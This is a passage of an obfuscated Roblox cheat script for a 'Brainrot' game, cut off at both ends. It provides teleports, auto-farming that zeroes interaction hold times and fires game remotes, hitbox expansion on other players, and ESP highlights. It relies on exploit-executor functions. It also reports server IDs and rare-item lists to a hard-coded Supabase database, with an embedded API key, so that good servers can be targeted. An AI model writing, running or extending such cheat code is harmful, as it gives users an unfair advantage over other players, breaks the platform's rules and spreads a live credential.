v2277.MaxActivationDistance=10;end);break;end end local v1432=tick() + 2 ;while v1427.Parent and (tick()<v1432)  do task.wait(0.1);end if v1427.Parent then return false;end pcall(function() local v1868=tostring(game.PlaceId);local v1869=tostring(game.JobId);local v1870="https://www.roblox.com/games/start?placeId="   .. v1868   .. "&gameInstanceId="   .. v1869   .. "&startPlaceId="   .. v1868 ;v10("🔷 Fragment Collected!","Fragment grabbed!\n[Join Server]("   .. v1870   .. ")" ,3381759);end);return true;end v62:CreateParagraph({Title="🚫 Forbidden Zone",Content="New underground zone.\nFuse 4 Brainrots → get Fragment → submit 10 to Throne → craft Forbidden La Everything Combinaziones."});v62:CreateSection("Teleport");v62:CreateButton({Name="🚫 Teleport to Forbidden Entry",Callback=function() local v1433=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v1433 then v1433.CFrame=CFrame.new(Vector3.new(4.677,57.931, -3700.579));end end});v62:CreateButton({Name="🧬 Teleport to Fuse Machine",Callback=function() local v1434=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v1434 then return;end local v1435=workspace:FindFirstChild("GameFolder");local v1436=v1435 and v1435:FindFirstChild("ForbiddenFuse") ;if v1436 then local v2107,v2108=pcall(function() return v1436:GetModelCFrame();end);if v2107 then v1434.CFrame=CFrame.new(v2108.Position + Vector3.new(0,4,6) );return;end end v1434.CFrame=CFrame.new(Vector3.new( -11.554,34, -6342));end});v62:CreateSection("Auto Collect");v62:CreateToggle({Name="Auto Farm Fragments",CurrentValue=false,Flag="AutoFragment",Callback=function(v1438) v46.autoFragmentEnabled=v1438;if v46.autoFragmentConn then v46.autoFragmentConn:Disconnect();v46.autoFragmentConn=nil;end if v46.autoFragmentThread then pcall(task.cancel,v46.autoFragmentThread);v46.autoFragmentThread=nil;end if  not v1438 then if v46._fragForcedInstantGrab then v46._fragForcedInstantGrab=false;v46.instantGrabEnabled=false;if v46.instantGrabConnection then v46.instantGrabConnection:Disconnect();v46.instantGrabConnection=nil;end for v2460,v2461 in pairs(v46.OriginalHoldTimes) do if (v2460 and v2460.Parent) then v2460.HoldDuration=v2461;end end v46.OriginalHoldTimes={};pcall(function() local v2462=v38.Flags and v38.Flags['InstantGrab'] ;if v2462 then v2462:Set(false);end end);end v38:Notify({Title="🔷 Fragments",Content="Auto Farm OFF",Duration=3,Image=4483362458});return;end v72();if  not v46.instantGrabEnabled then v46._fragForcedInstantGrab=true;v46.instantGrabEnabled=true;for v2280,v2281 in ipairs(workspace:GetDescendants()) do if v2281:IsA("ProximityPrompt") then if  not v46.OriginalHoldTimes[v2281] then v46.OriginalHoldTimes[v2281]=v2281.HoldDuration;end v2281.HoldDuration=0;end end v46.instantGrabConnection=workspace.DescendantAdded:Connect(function(v2282) if v2282:IsA("ProximityPrompt") then task.wait();if  not v46.OriginalHoldTimes[v2282] then v46.OriginalHoldTimes[v2282]=v2282.HoldDuration;end v2282.HoldDuration=0;end end);pcall(function() local v2283=v38.Flags and v38.Flags['InstantGrab'] ;if v2283 then v2283:Set(true);end end);else v46._fragForcedInstantGrab=false;end v38:Notify({Title="🔷 Auto Farm Fragments",Content="Running — Remove Lava + Instant Grab active.",Duration=4,Image=4483362458});v46.autoFragmentThread=task.spawn(function() local v1871={};while v46.autoFragmentEnabled do local v2115=v40.Character;local v2116=v2115 and v2115:FindFirstChild("HumanoidRootPart") ;if  not v2116 then task.wait(0.5);continue;end for v2284 in pairs(v1871) do if  not v2284.Parent then v1871[v2284]=nil;end end local v2117=v942();local v2118={};for v2285,v2286 in ipairs(v2117) do if  not v1871[v2286] then table.insert(v2118,v2286);end end if ( #v2118==0) then task.wait(1);continue;end table.sort(v2118,function(v2287,v2288) local function v2289(v2399) if v2399:IsA("BasePart") then return v2399.Position;end local v2400,v2401=pcall(function() return v2399:GetModelCFrame();end);return (v2400 and v2401.Position) or Vector3.zero ;end return (v2289(v2287) -v2116.Position).Magnitude<(v2289(v2288) -v2116.Position).Magnitude ;end);local v2119=0;for v2290,v2291 in ipairs(v2118) do if  not v46.autoFragmentEnabled then break;end if v46.grabLock then break;end v1871[v2291]=true;local v2293,v2294=pcall(v943,v2291);if (v2293 and v2294) then v2119+=1 end end if ((v2119>0) and v46.autoFragmentEnabled) then pcall(function() local v2466=game:GetService("ReplicatedStorage");local v2467=v2466:FindFirstChild("SubmitFragment");if v2467 then v2467:FireServer();end end);pcall(v83);task.wait(2.5);end task.wait(0.5);end end);v46.autoFragmentConn=workspace.DescendantAdded:Connect(function(v1872) if  not v46.autoFragmentEnabled then return;end local v1873=v1872.Name:lower();if  not (v1873:find("fragment") or (v1873=="frag")) then return;end if  not (v1872:IsA("BasePart") or v1872:IsA("Model")) then return;end end);end});v62:CreateSection("Fragments");v62:CreateButton({Name="🔷 Submit Fragment (x1)",Callback=function() local v1442=game:GetService("ReplicatedStorage");local v1443=v1442:FindFirstChild("SubmitFragment");if  not v1443 then v38:Notify({Title="❌ Submit Fragment",Content="SubmitFragment remote not found.",Duration=4,Image=4483362458});return;end local v1444,v1445=pcall(function() v1443:FireServer();end);if v1444 then v38:Notify({Title="🔷 Fragment Submitted",Content="Fired SubmitFragment!",Duration=3,Image=4483362458});else v38:Notify({Title="❌ Error",Content=tostring(v1445),Duration=4,Image=4483362458});end end});v62:CreateSection("Forbidden Fuse");v62:CreateButton({Name="🧬 Open Forbidden Fuse UI",Callback=function() local v1446=workspace:FindFirstChild("GameFolder");local v1447=v1446 and v1446:FindFirstChild("ForbiddenFuse") ;if  not v1447 then v38:Notify({Title="❌ ForbiddenFuse",Content="ForbiddenFuse not found in workspace.",Duration=4,Image=4483362458});return;end local v1448=v1447:FindFirstChild("UIButton");local v1449=v1448 and v1448:FindFirstChildWhichIsA("ProximityPrompt",true) ;if v1449 then pcall(function() if (typeof(fireproximityprompt)=="function") then fireproximityprompt(v1449);end end);v38:Notify({Title="🧬 ForbiddenFuse",Content="Opened UI!",Duration=3,Image=4483362458});else local v2120=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v2120 then v2120.CFrame=CFrame.new(Vector3.new( -11.554,34, -6342));end v38:Notify({Title="🧬 ForbiddenFuse",Content="Prompt not found, teleported to machine.",Duration=3,Image=4483362458});end end});v62:CreateButton({Name="📦 Collect Fuse Result",Callback=function() local v1450=workspace:FindFirstChild("GameFolder");local v1451=v1450 and v1450:FindFirstChild("ForbiddenFuse") ;local v1452=v1451 and v1451:FindFirstChild("Result") ;if  not v1452 then v38:Notify({Title="❌ Result",Content="No result part found.",Duration=3,Image=4483362458});return;end local v1453=v1452:FindFirstChild("CollectAttachment");local v1454=v1453 and v1453:FindFirstChildWhichIsA("ProximityPrompt") ;if v1454 then pcall(function() if (typeof(fireproximityprompt)=="function") then fireproximityprompt(v1454);end end);v38:Notify({Title="📦 Collected!",Content="Fired collect prompt.",Duration=3,Image=4483362458});else local v2121=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v2121 then v2121.CFrame=CFrame.new(v1452.Position + Vector3.new(0,3,0) );if (typeof(firetouchinterest)=="function") then pcall(function() firetouchinterest(v2121,v1452,0);end);task.wait(0.05);pcall(function() firetouchinterest(v2121,v1452,1);end);end end v38:Notify({Title="📦 Collect",Content="Prompt not found, used touch.",Duration=3,Image=4483362458});end end});end)();v64:CreateSection("Teleport to Zones");do local v944={{name="Common Zone",pos=Vector3.new( -5.604886,6.981283, -181.638321)},{name="Rare Zone",pos=Vector3.new(3.469897,21.468637, -381.855286)},{name="Epic Zone",pos=Vector3.new(1.057454,19.64805, -653.96228)},{name="Legendary Zone",pos=Vector3.new(34.306286,29.472792, -933.720398)},{name="Mythic Zone",pos=Vector3.new( -4.003283,41.508194, -1372.488647)},{name="Secret Zone",pos=Vector3.new( -41.617702,77.059113, -1857.829224)},{name="Celestial Zone",pos=Vector3.new( -44.376785,170.02887, -2253.302979)},{name="End Zone",pos=Vector3.new( -16.794611,444.921265, -3505.147217)},{name="🚫 Forbidden Zone",pos=Vector3.new(4.677,57.931, -3700.579)}};for v1455,v1456 in ipairs(v944) do v64:CreateButton({Name=v1456.name,Callback=function() local v1874=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v1874 then v1874.CFrame=CFrame.new(v1456.pos);end end});end end v65:CreateSection("Hitbox Settings");v65:CreateToggle({Name="Hitbox On/Off",CurrentValue=false,Flag="HitboxToggle",Callback=function(v945) v46.hitboxEnabled=v945;if  not v945 then for v2122,v2123 in next,v0:GetPlayers() do if (v2123~=v40) then pcall(function() local v2468=v2123.Character and v2123.Character:FindFirstChild("HumanoidRootPart") ;if v2468 then v2468.Size=Vector3.new(2,2,1);v2468.Transparency=1;v2468.CanCollide=false;end end);end end end end});v65:CreateSlider({Name="Hitbox Size",Range={5,150},Increment=5,Suffix="Studs",CurrentValue=50,Flag="HitboxSize",Callback=function(v947) v46.hitboxSize=v947;end});v65:CreateSlider({Name="Hitbox Transparency",Range={0,10},Increment=1,Suffix="/10",CurrentValue=7,Flag="HitboxTransp",Callback=function(v949) v46.hitboxTransp=v949/10 ;end});v65:CreateDropdown({Name="Hitbox Color",Options={"Really blue","Bright red","Lime green","Hot pink","Cyan","Really black","White"},CurrentOption={"Really blue"},Flag="HitboxColor",Callback=function(v951) v46.hitboxColor=BrickColor.new(((type(v951)=="table") and v951[1]) or v951 );end});v66:CreateSection("Visual Enhancements");v66:CreateToggle({Name="FullBright",CurrentValue=false,Flag="FullBright",Callback=function(v953) v46.fullBrightEnabled=v953;if v953 then v8.Brightness=2;v8.ClockTime=14;v8.FogEnd=100000;v8.GlobalShadows=false;v8.OutdoorAmbient=Color3.fromRGB(128,128,128);else v8.Brightness=v9[1];v8.ClockTime=v9[2];v8.FogEnd=v9[3];v8.GlobalShadows=v9[4];v8.OutdoorAmbient=v9[5];end end});v66:CreateButton({Name="Remove Fog",Callback=function() v8.FogEnd=100000;v8.FogStart=0;end});v66:CreateToggle({Name="Infinite Zoom",CurrentValue=false,Flag="InfiniteZoom",Callback=function(v957) v46.infiniteZoomEnabled=v957;if v957 then v40.CameraMaxZoomDistance=99999;v40.CameraMinZoomDistance=0;else v40.CameraMaxZoomDistance=128;v40.CameraMinZoomDistance=0.5;end end});v66:CreateSection("ESP Features");v66:CreateToggle({Name="Player ESP",CurrentValue=false,Flag="PlayerESP",Callback=function(v959) local function v960(v1457) if ( not v1457 or  not v1457:FindFirstChild("HumanoidRootPart")) then return;end if v1457:FindFirstChild("PlayerESP") then return;end local v1458=Instance.new("Highlight");v1458.Parent=v1457;v1458.FillColor=Color3.fromRGB(255,0,0);v1458.OutlineColor=Color3.fromRGB(255,255,255);v1458.FillTransparency=0.5;v1458.OutlineTransparency=0;v1458.Name="PlayerESP";end local function v961(v1465) if v1465 then local v2124=v1465:FindFirstChild("PlayerESP");if v2124 then v2124:Destroy();end end end v46.playerESPEnabled=v959;if v959 then for v2125,v2126 in pairs(v0:GetPlayers()) do if ((v2126~=v40) and v2126.Character) then v960(v2126.Character);end end v46.espConnections.PlayerAdded=v0.PlayerAdded:Connect(function(v2127) if v46.playerESPEnabled then v2127.CharacterAdded:Connect(function(v2469) if v46.playerESPEnabled then task.wait(0.5);v960(v2469);end end);end end);for v2128,v2129 in pairs(v0:GetPlayers()) do if (v2129~=v40) then v46.espConnections[v2129.UserId]=v2129.CharacterAdded:Connect(function(v2470) if v46.playerESPEnabled then task.wait(0.5);v960(v2470);end end);end end else for v2130,v2131 in pairs(v0:GetPlayers()) do if v2131.Character then v961(v2131.Character);end end for v2132,v2133 in pairs(v46.espConnections) do if v2133 then v2133:Disconnect();end end v46.espConnections={};end end});v66:CreateToggle({Name="Celestial ESP",CurrentValue=false,Flag="CelestialESP",Callback=function(v963) v46.celestialESPEnabled=v963;if v963 then local function v1896() pcall(function() local v2296=workspace:FindFirstChild("GameFolder");if  not v2296 then return;end local v2297=v2296:FindFirstChild("Brainrots");if  not v2297 then return;end local v2298=v2297:FindFirstChild("Celestial");if  not v2298 then return;end for v2405,v2406 in pairs(v2298:GetChildren()) do if (v2406:IsA("Model") and  not v2406:FindFirstChild("CelestialESP")) then local v2512=Instance.new("Highlight");v2512.Parent=v2406;v2512.FillColor=Color3.fromRGB(255,255,0);v2512.OutlineColor=Color3.fromRGB(255,255,255);v2512.FillTransparency=0.3;v2512.OutlineTransparency=0;v2512.Name="CelestialESP";end end end);end v1896();v46.celestialESPConnection=task.spawn(function() while v46.celestialESPEnabled do task.wait(1);v1896();end end);else if v46.celestialESPConnection then v46.celestialESPEnabled=false;v46.celestialESPConnection=nil;end pcall(function() local v2134=workspace:FindFirstChild("GameFolder");if  not v2134 then return;end local v2135=v2134:FindFirstChild("Brainrots");if  not v2135 then return;end local v2136=v2135:FindFirstChild("Celestial");if  not v2136 then return;end for v2301,v2302 in pairs(v2136:GetDescendants()) do if (v2302.Name=="CelestialESP") then v2302:Destroy();end end end);end end});(function() local v965={Common=Color3.fromRGB(180,180,180),Uncommon=Color3.fromRGB(100,220,100),Rare=Color3.fromRGB(80,140,255),Epic=Color3.fromRGB(180,80,255),Legendary=Color3.fromRGB(255,180,0),Mythic=Color3.fromRGB(255,80,80),Secret=Color3.fromRGB(80,220,220),Celestial=Color3.fromRGB(255,220,100),Godly=Color3.fromRGB(255,120,30)};local v966={Gold=Color3.fromRGB(255,215,0),Emerald=Color3.fromRGB(80,200,120),Diamond=Color3.fromRGB(150,220,255),Cheese=Color3.fromRGB(255,200,50),Bloodmoon=Color3.fromRGB(200,40,40),Rainbow=Color3.fromRGB(255,100,200),Normal=Color3.fromRGB(120,120,140)};local v967=Instance.new("ScreenGui");v967.Name="OxyoBrainrotList";v967.ResetOnSpawn=false;v967.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;v967.DisplayOrder=999;v967.IgnoreGuiInset=true;pcall(function() v967.Parent=game:GetService("CoreGui");end);if  not v967.Parent then v967.Parent=v40.PlayerGui;end local v974=Instance.new("Frame");v974.Name="Panel";v974.Size=UDim2.new(0,320,0,400);v974.Position=UDim2.new(0.5, -160,0.5, -200);v974.BackgroundColor3=Color3.fromRGB(13,13,20);v974.BorderSizePixel=0;v974.Visible=false;v974.ClipsDescendants=true;v974.Parent=v967;Instance.new("UICorner",v974).CornerRadius=UDim.new(0,10);local v984=Instance.new("UIStroke",v974);v984.Color=Color3.fromRGB(55,55,75);v984.Thickness=1;local v987=Instance.new("Frame",v974);v987.Name="TitleBar";v987.Size=UDim2.new(1,0,0,40);v987.BackgroundColor3=Color3.fromRGB(18,18,28);v987.BorderSizePixel=0;Instance.new("UICorner",v987).CornerRadius=UDim.new(0,10);local v993=Instance.new("Frame",v987);v993.Size=UDim2.new(1,0,0,10);v993.Position=UDim2.new(0,0,1, -10);v993.BackgroundColor3=Color3.fromRGB(18,18,28);v993.BorderSizePixel=0;local v998=Instance.new("TextLabel",v987);v998.Size=UDim2.new(1, -50,1,0);v998.Position=UDim2.new(0,14,0,0);v998.BackgroundTransparency=1;v998.TextColor3=Color3.fromRGB(240,240,255);v998.TextXAlignment=Enum.TextXAlignment.Left;v998.Font=Enum.Font.GothamBold;v998.TextSize=14;v998.Text="🧠  Brainrot List";local v1009=Instance.new("TextButton",v987);v1009.Size=UDim2.new(0,26,0,26);v1009.Position=UDim2.new(1, -33,0.5, -13);v1009.BackgroundColor3=Color3.fromRGB(160,35,35);v1009.Text="✕";v1009.TextColor3=Color3.fromRGB(255,255,255);v1009.Font=Enum.Font.GothamBold;v1009.TextSize=12;v1009.BorderSizePixel=0;Instance.new("UICorner",v1009).CornerRadius=UDim.new(0,6);local v1019=Instance.new("Frame",v974);v1019.Size=UDim2.new(1, -16,0,32);v1019.Position=UDim2.new(0,8,0,44);v1019.BackgroundColor3=Color3.fromRGB(18,18,28);v1019.BorderSizePixel=0;Instance.new("UICorner",v1019).CornerRadius=UDim.new(0,6);local v1025=Instance.new("TextLabel",v1019);v1025.Size=UDim2.new(0.55,0,1,0);v1025.Position=UDim2.new(0,10,0,0);v1025.BackgroundTransparency=1;v1025.TextColor3=Color3.fromRGB(170,170,210);v1025.Font=Enum.Font.Gotham;v1025.TextSize=11;v1025.TextXAlignment=Enum.TextXAlignment.Left;v1025.Text="Viewing: All";local v1035=Instance.new("TextLabel",v1019);v1035.Size=UDim2.new(0.45, -10,1,0);v1035.Position=UDim2.new(0.55,0,0,0);v1035.BackgroundTransparency=1;v1035.TextColor3=Color3.fromRGB(100,210,100);v1035.Font=Enum.Font.GothamBold;v1035.TextSize=11;v1035.TextXAlignment=Enum.TextXAlignment.Right;v1035.Text="Count: 0";local v1045=Instance.new("TextBox",v974);v1045.Size=UDim2.new(1, -16,0,30);v1045.Position=UDim2.new(0,8,0,82);v1045.BackgroundColor3=Color3.fromRGB(30,30,50);v1045.BorderSizePixel=0;v1045.TextColor3=Color3.fromRGB(230,230,255);v1045.PlaceholderText="🔍  Search...";v1045.PlaceholderColor3=Color3.fromRGB(100,100,140);v1045.Font=Enum.Font.Gotham;v1045.TextSize=12;v1045.TextXAlignment=Enum.TextXAlignment.Left;v1045.ClearTextOnFocus=false;v1045.Text="";Instance.new("UICorner",v1045).CornerRadius=UDim.new(0,7);local v1059=Instance.new("UIStroke",v1045);v1059.Color=Color3.fromRGB(80,80,130);v1059.Thickness=1.5;local v1062=Instance.new("UIPadding",v1045);v1062.PaddingLeft=UDim.new(0,8);local v1064=Instance.new("ScrollingFrame",v974);v1064.Size=UDim2.new(1, -16,1, -124);v1064.Position=UDim2.new(0,8,0,118);v1064.BackgroundTransparency=1;v1064.BorderSizePixel=0;v1064.ScrollBarThickness=4;v1064.ScrollBarImageColor3=Color3.fromRGB(70,70,110);v1064.CanvasSize=UDim2.new(0,0,0,0);v1064.AutomaticCanvasSize=Enum.AutomaticSize.Y;v1064.ElasticBehavior=Enum.ElasticBehavior.Always;local v1076=Instance.new("UIListLayout",v1064);v1076.SortOrder=Enum.SortOrder.LayoutOrder;v1076.Padding=UDim.new(0,5);local v1080=Instance.new("UIPadding",v1064);v1080.PaddingLeft=UDim.new(0,1);v1080.PaddingRight=UDim.new(0,1);v1080.PaddingTop=UDim.new(0,2);local v1084,v1085,v1086,v1087,v1088=false,{},nil,nil,"";local v1089;v1045:GetPropertyChangedSignal("Text"):Connect(function() v1088=v1045.Text:lower();pcall(v1089);end);local function v1090() for v1900,v1901 in pairs(v1085) do pcall(function() v1901:Destroy();end);end v1085={};end local function v1091(v1467,v1468) local v1469=v46.traitData[v1467.obj];local v1470=(v1469 and ( #v1469.traitNames>0) and table.concat(v1469.traitNames,"+")) or "—" ;local v1471=v1467.mutation or "Normal" ;local v1472=v965[v1467.rarity] or Color3.fromRGB(200,200,200) ;local v1473=v966[v1471] or Color3.fromRGB(140,140,140) ;local v1474=Instance.new("Frame",v1064);v1474.Size=UDim2.new(1, -4,0,60);v1474.BackgroundColor3=Color3.fromRGB(20,20,30);v1474.BorderSizePixel=0;v1474.LayoutOrder=v1468;Instance.new("UICorner",v1474).CornerRadius=UDim.new(0,7);local v1480=Instance.new("UIStroke",v1474);v1480.Color=v1472;v1480.Thickness=1;v1480.Transparency=0.55;local v1484=Instance.new("Frame",v1474);v1484.Size=UDim2.new(0,4,1,0);v1484.BackgroundColor3=v1472;v1484.BorderSizePixel=0;Instance.new("UICorner",v1484).CornerRadius=UDim.new(0,4);local v1489=Instance.new("TextLabel",v1474);v1489.Size=UDim2.new(1, -100,0,20);v1489.Position=UDim2.new(0,12,0,5);v1489.BackgroundTransparency=1;v1489.TextColor3=Color3.fromRGB(240,240,255);v1489.Font=Enum.Font.GothamBold;v1489.TextSize=12;v1489.TextXAlignment=Enum.TextXAlignment.Left;v1489.TextTruncate=Enum.TextTruncate.AtEnd;v1489.Text=tostring(v1467.name or "?" );local v1502=Instance.new("TextLabel",v1474);v1502.Size=UDim2.new(1, -100,0,14);v1502.Position=UDim2.new(0,12,0,24);v1502.BackgroundTransparency=1;v1502.TextColor3=v1472;v1502.Font=Enum.Font.Gotham;v1502.TextSize=10;v1502.TextXAlignment=Enum.TextXAlignment.Left;v1502.Text=v1467.rarity;local v1513=Instance.new("TextLabel",v1474);v1513.Size=UDim2.new(1, -100,0,14);v1513.Position=UDim2.new(0,12,0,39);v1513.BackgroundTransparency=1;v1513.TextColor3=v1473;v1513.Font=Enum.Font.Gotham;v1513.TextSize=9;v1513.TextXAlignment=Enum.TextXAlignment.Left;v1513.Text="Mut: "   .. v1471   .. "  ·  Trait: "   .. v1470 ;local v1522=Instance.new("TextButton",v1474);v1522.Size=UDim2.new(0,68,0,26);v1522.Position=UDim2.new(1, -76,0.5, -13);v1522.BackgroundColor3=Color3.fromRGB(35,75,160);v1522.Text="⟶ TP";v1522.TextColor3=Color3.fromRGB(255,255,255);v1522.Font=Enum.Font.GothamBold;v1522.TextSize=11;v1522.BorderSizePixel=0;Instance.new("UICorner",v1522).CornerRadius=UDim.new(0,6);v1522.MouseButton1Click:Connect(function() pcall(function() local v2137=v1467.obj;if ( not v2137 or  not v2137.Parent) then v38:Notify({Title="Brainrot List",Content="Brainrot no longer exists!",Duration=3,Image=4483362458});return;end local v2138=v2137.PrimaryPart or v2137:FindFirstChildWhichIsA("BasePart") ;if v2138 then v68(v2138.CFrame * CFrame.new(0,4,0) );v38:Notify({Title="Teleported!",Content=v1467.name,Duration=2,Image=4483362458});end end);end);v1522.MouseEnter:Connect(function() v1522.BackgroundColor3=Color3.fromRGB(55,100,200);end);v1522.MouseLeave:Connect(function() v1522.BackgroundColor3=Color3.fromRGB(35,75,160);end);table.insert(v1085,v1474);end function v1089() v1090();local v1532=v50.brainrots;local v1533={};for v1904,v1905 in ipairs(v1532) do if (v1905.obj and v1905.obj.Parent) then if ((v1087==nil) or (v1905.rarity==v1087)) then if ((v1088=="") or v1905.name:lower():find(v1088,1,true)) then table.insert(v1533,v1905);end end end end table.sort(v1533,function(v1906,v1907) local v1908=v49[v1906.rarity] or 99 ;local v1909=v49[v1907.rarity] or 99 ;if (v1908~=v1909) then return v1908<v1909 ;end local v1910=((v1906.mutation~="Normal") and 0) or 1 ;local v1911=((v1907.mutation~="Normal") and 0) or 1 ;if (v1910~=v1911) then return v1910<v1911 ;end return v1906.name<v1907.name ;end);for v1912,v1913 in ipairs(v1533) do v1091(v1913,v1912);end v1025.Text="Viewing: "   .. (v1087 or "All") ;v1035.Text="Count: "   ..  #v1533 ;end local function v1092() v1084=false;if v1086 then pcall(task.cancel,v1086);v1086=nil;end end local function v1093(v1536) v1087=v1536;v1088="";v1045.Text="";v1084=true;v974.Visible=true;v1064.CanvasPosition=Vector2.new(0,0);pcall(v1089);if v1086 then pcall(task.cancel,v1086);end v1086=task.spawn(function() while v1084 do task.wait(3);pcall(v1089);end end);end v1009.MouseButton1Click:Connect(function() v974.Visible=false;v1092();end);local v1094={active=false,start=nil,startPos=nil};v987.InputBegan:Connect(function(v1541) if ((v1541.UserInputType==Enum.UserInputType.MouseButton1) or (v1541.UserInputType==Enum.UserInputType.Touch)) then v1094.active=true;v1094.start=v1541.Position;v1094.startPos=v974.Position;v1541.Changed:Connect(function() if (v1541.UserInputState==Enum.UserInputState.End) then v1094.active=false;end end);end end);v3.InputChanged:Connect(function(v1542) if  not v1094.active then return;end if ((v1542.UserInputType==Enum.UserInputType.MouseMovement) or (v1542.UserInputType==Enum.UserInputType.Touch)) then local v2144=v1542.Position-v1094.start ;v974.Position=UDim2.new(v1094.startPos.X.Scale,v1094.startPos.X.Offset + v2144.X ,v1094.startPos.Y.Scale,v1094.startPos.Y.Offset + v2144.Y );end end);v57:CreateSection("Rarities");v57:CreateButton({Name="📋  All Brainrots",Callback=function() v1093(nil);end});for v1543,v1544 in ipairs({"Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly"}) do v57:CreateButton({Name=v1544,Callback=function() v1093(v1544);end});end end)();task.spawn(function() while true do task.wait(400);pcall(function() v26.flush("RarityDir");v26.del("Brainrots");v74={};v96={};getgenv().OxyoExecQueued=false;end);end end);task.spawn(function() while true do task.wait(60);pcall(function() if (v25.size()>80) then v25.clear("misc");end end);end end);pcall(function() v38:LoadConfiguration();end);task.spawn(function() while true do task.wait(30);pcall(function() v38:SaveConfiguration();end);end end);(function() local v1095=getgenv()._isPrivateServer or function() return false;end ;local v1096="https://uqbcysqwszxnvjrigkkp.supabase.co";local v1097="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVxYmN5c3F3c3p4bnZqcmlna2twIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUyOTQyNjMsImV4cCI6MjA5MDg3MDI2M30.C_RmmYmon8ctloCj9rIxDHnODYaFZPxIBXaLmNdeOAE";local v1098=game:GetService("HttpService");local v1099=tostring(game.JobId):gsub("-","_");local v1100=tostring(game.JobId);local v1101=((typeof(request)=="function") and request) or ((typeof(http)=="table") and (typeof(http.request)=="function") and http.request) or ((typeof(syn)=="table") and (typeof(syn.request)=="function") and syn.request) or nil ;local function v1102(v1545,v1546,v1547,v1548,v1549) if  not v1101 then return nil;end v1549=v1549 or 7 ;local v1550=v1096   .. "/rest/v1/"   .. v1546 ;if (v1547 and (v1547~="")) then v1550=v1550   .. "?"   .. v1547 ;end local v1551={apikey=v1097,Authorization="Bearer "   .. v1097 ,["Content-Type"]="application/json",Accept="application/json"};if (v1545=="POST") then v1551['Prefer']="resolution=merge-duplicates,return=minimal";end if (v1545=="DELETE") then v1551['Prefer']="return=minimal";end local v1552,v1553=false,nil;local v1554=Instance.new("BindableEvent");task.spawn(function() local v1915,v1916=pcall(v1101,{Url=v1550,Method=v1545,Headers=v1551,Body=(v1548 and v1098:JSONEncode(v1548)) or nil });if (v1915 and v1916) then local v2303=((v1916.Body~=nil) and (v1916.Body~="") and v1916.Body) or "null" ;local v2304,v2305=pcall(v1098.JSONDecode,v1098,v2303);if v2304 then v1553=((v2305==nil) and {}) or v2305 ;end if (v1545=="DELETE") then v1553=v1553 or {} ;end end if  not v1552 then v1552=true;pcall(function() v1554:Fire();end);end end);local v1555=tick() + v1549 ;local v1556;v1556=v1554.Event:Connect(function() v1552=true;pcall(function() v1556:Disconnect();end);end);while  not v1552 and (tick()<v1555)  do task.wait(0.05);end v1552=true;pcall(function() v1556:Disconnect();end);pcall(function() v1554:Destroy();end);return v1553;end local function v1103(v1557) return v1102("POST","servers","",{job_key=v1099,job_id=v1557.j,place_id=v1557.p,t=v1557.t,c=v1557.c,b=v1557.b,coin_rain=v1557.coinRain,has_frag=v1557.hasFrag});end local function v1104(v1558) return v1102("POST","servers","",{job_key=v1099,t=v1558.t,c=v1558.c or 0 ,coin_rain=v1558.coinRain,has_frag=v1558.hasFrag});end local function v1105(v1559) return v1102("DELETE","servers","job_key=eq."   .. v1559 ,nil,5);end local function v1106(v1560) local v1561=v1102("GET","servers","select=*",nil,v1560 or 7 );if (type(v1561)~="table") then return nil;end local v1562={};for v1917,v1918 in ipairs(v1561) do if v1918.job_key then v1562[v1918.job_key]={j=v1918.job_id,p=v1918.place_id,t=v1918.t,c=v1918.c or 0 ,b=v1918.b,coinRain=v1918.coin_rain,hasFrag=v1918.has_frag};end end return v1562;end local v1107,v1108,v1109,v1110,v1111=10,30,0,false,0;local function v1112(v1563) if v1563 then v1109=0;v1110=false;else v1109+=1 if ((v1109>=v1107) and  not v1110) then v1110=true;v1111=tick();end end end local function v1113() if  not v1110 then return true;end if ((tick() -v1111)>=v1108) then v1110=false;v1109=0;return true;end return false;end local function v1114(v1564,v1565,v1566,v1567,v1568) if  not v1113() then return nil;end local v1569=v1102(v1564,v1565,v1566,v1567,v1568);v1112(v1569~=nil );return v1569;end local v1115,v1116,v1117=false,nil,0;local function v1118() local v1570={};for v1919,v1920 in ipairs(v50.brainrots) do if (v1920.obj and v1920.obj.Parent) then local v2307=nil;local v2308=v46.traitData[v1920.obj];if (v2308 and ( #v2308.traitNames>0)) then v2307=v2308.traitNames;end table.insert(v1570,{n=v1920.name,r=v1920.rarity,m=(v1920.mutation and (v1920.mutation~="Normal") and v1920.mutation) or nil ,t=v2307});end end return v1570;end local function v1119(v1571) if (v1109>2) then return 25;end if (v1571==0) then return 25;end if (v1571>=10) then return 12;end return 18;end local function v1120() if v1095() then return 0;end local v1572=v1118();local v1573=v77();local v1574=false;for v1921,v1922 in ipairs(workspace:GetDescendants()) do if v1922.Parent then local v2309=v1922.Name:lower();if (v2309:find("fragment") or (v2309=="frag")) then v1574=true;break;end end end local v1575={j=v1100,p=game.PlaceId,t=os.time(),c= #v1572,coinRain=v1573=="active" ,hasFrag=v1574};local v1576;if ( #v1572>0) then v1575.b=v1572;v1576=v1103(v1575);else v1576=v1104({t=os.time(),c=0,coinRain=v1575.coinRain,hasFrag=v1575.hasFrag});end if (v1576~=nil) then v1117=tick();end return  #v1572;end local function v1121() if v1115 then return;end v1115=true;v1117=tick();v1116=task.spawn(function() while v1115 do local v2149=0;pcall(function() v2149=v1120() or 0 ;end);task.wait(v1119(v2149));end pcall(function() v1105(v1099);end);end);end local function v1122() v1115=false;if v1116 then pcall(task.cancel,v1116);v1116=nil;end pcall(function() v1105(v1099);end);end task.spawn(function() task.wait(60);while true do task.wait(30);if v1115 then local v2310=(tick() -v1117)>90 ;local v2311=v1116==nil ;if (v2310 or v2311) then if v1116 then pcall(task.cancel,v1116);v1116=nil;end v1115=false;v1117=tick();v1121();end end end end);task.spawn(function() while true do task.wait(300);pcall(function() while  #_webhookHistory>30  do table.remove(_webhookHistory);end local v2150=tick();for v2312,v2313 in next,{"oxyo"} do for v2407= #_queues[v2313],1, -1 do if ((v2150-(_queues[v2313][v2407].queuedAt or 0))>600) then table.remove(_queues[v2313],v2407);end end end end);end end);local v1123=tostring(game.JobId):gsub("-","_")   .. 